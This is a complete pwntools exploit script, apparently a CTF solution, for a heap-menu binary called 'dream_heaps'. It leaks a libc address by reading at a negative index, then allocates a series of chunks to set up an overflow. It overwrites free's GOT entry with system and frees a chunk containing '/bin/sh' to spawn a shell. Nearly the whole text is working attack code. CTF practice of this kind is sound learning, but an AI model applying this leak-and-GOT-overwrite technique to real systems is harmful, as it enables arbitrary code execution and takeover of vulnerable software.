from pwn import *

target = process('./dream_heaps')
elf = context.binary = ELF('./dream_heaps')
libc = elf.libc# If you have a different libc file, run it here

#gdb.attach(target)
'''
puts = 0x662f0
system = 0x3f630
offset = system - puts
'''

def write(contents, size):
  print(target.recvuntil(b'> '))
  target.sendline(b'1')
  print(target.recvuntil(b'dream?'))
  target.sendline(str(size).encode('utf-8'))
  print(target.recvuntil(b'dream?'))
  target.send(contents.encode('utf-8'))

def read(index):
  print(target.recvuntil(b'> '))
  target.sendline(b'2')
  print(target.recvuntil(b'read?'))
  target.sendline(str(index).encode('utf-8'))
  leak = target.recvuntil(b"What")
  leak = leak.replace(b"What", b"")
  leak = leak.replace(b"\x0a", b"")
  leak = leak + b"\x00"*(8 - len(leak))
  leak = u64(leak)
  print("Leak is: " + hex(leak))
  return leak

def edit(index, contents):
  print(target.recvuntil(b'> '))
  target.sendline(b'3')
  print(target.recvuntil(b'change?'))
  target.sendline(str(index).encode('utf-8'))
  target.send(contents[:6])

def delete(index):
  print(target.recvuntil(b'> '))
  target.sendline(b'4')
  print(target.recvuntil(b'delete?'))
  target.sendline(str(index).encode('utf-8'))

# Get the libc infoleak via absuing index bug
puts = read(-263021)
libcBase = puts - libc.symbols['puts']
print(hex(libcBase))

# Setup got table overwrite via an overflow
write('/bin/sh\x00', 0x10)
write('0'*10, 0x20)
write('0'*10, 0x30)
write('0'*10, 0x40)
write('0'*10, 0x50)
write('0'*10, 0x60)
write('0'*10, 0x70)
write('0'*10, 0x80)
write('0'*10, 0x90)
write('0'*10, 0xa0)
write('0'*10, 0xb0)
write('0'*10, 0xc0)
write('0'*10, 0xd0)
write('0'*10, 0xe0)
write('0'*10, 0xf0)
write('0'*10, 0x11)
write('0'*10, 0x22)
write('0'*10, 0x18)
write('0'*10, 0x602018)
write('0'*10, 00)

# Write libc address of system to got free address
edit(17, p64(libcBase + libc.symbols['system']))

# Free dream that points to `/bin/sh` to get a shell
delete(0)

target.interactive()
